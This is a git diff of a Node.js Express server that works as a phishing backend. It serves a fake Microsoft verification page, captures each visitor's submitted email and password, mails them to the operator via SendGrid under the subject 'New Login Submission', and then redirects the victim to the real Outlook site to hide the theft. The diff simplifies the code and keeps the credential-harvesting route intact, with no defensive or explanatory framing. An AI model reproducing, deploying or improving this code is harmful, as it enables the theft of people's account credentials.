@@ -1,84 +1,39 @@
+require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const sgMail = require('@sendgrid/mail');
 const path = require('path');
 
 const app = express();
-const port = process.env.PORT || 3000;
+const port = 3000;
 
-// Configure SendGrid
-const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
-const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;
+sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-if (SENDGRID_API_KEY && RECEIVER_EMAIL) {
-  sgMail.setApiKey(SENDGRID_API_KEY);
-  console.log('✅ SendGrid configured.');
-} else {
-  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will not be sent.');
-}
-
-// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// Home page
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
 });
 
-// Form submission
-app.post('/submit', async (req, res, next) => {
+app.post('/submit', (req, res) => {
   const { email, password } = req.body;
 
-  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
-    return res.status(500).send('Server not configured to send emails.');
-  }
-
   const msg = {
-    to: RECEIVER_EMAIL,
-    from: RECEIVER_EMAIL,
+    to: process.env.RECEIVER_EMAIL,
+    from: process.env.RECEIVER_EMAIL,
     subject: 'New Login Submission',
     text: `Email: ${email}\nPassword: ${password}`,
   };
 
-  try {
-    await sgMail.send(msg);
-
-    // Redirect user safely after sending
-    return res.redirect('https://outlook.office365.com');
-  } catch (error) {
-    console.error('SendGrid error:', error.message || error);
-    return res.status(500).send('❌ Error sending email.');
-  }
-});
-
-// Test route (safe, no keys revealed)
-app.get('/test', async (req, res) => {
-  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
-    return res.send('⚠️ Env vars missing. Cannot send test email.');
-  }
-
-  try {
-    await sgMail.send({
-      to: RECEIVER_EMAIL,
-      from: RECEIVER_EMAIL,
-      subject: 'Test Email',
-      text: 'This is a test email from your app. No sensitive info shown.',
+  sgMail.send(msg)
+    .then(() => res.redirect('https://outlook.office365.com'))
+    .catch(error => {
+      console.error(error);
+      res.status(500).send('Error sending email.');
     });
-    res.send('✅ Test email sent successfully!');
-  } catch (err) {
-    console.error('SendGrid test error:', err.message || err);
-    res.send('❌ Test email failed. Check logs.');
-  }
 });
 
-// Global error handler (prevents container crash)
-app.use((err, req, res, next) => {
-  console.error('Unhandled error:', err);
-  res.status(500).send('Internal Server Error');
-});
-
-// Start server
 app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
 });
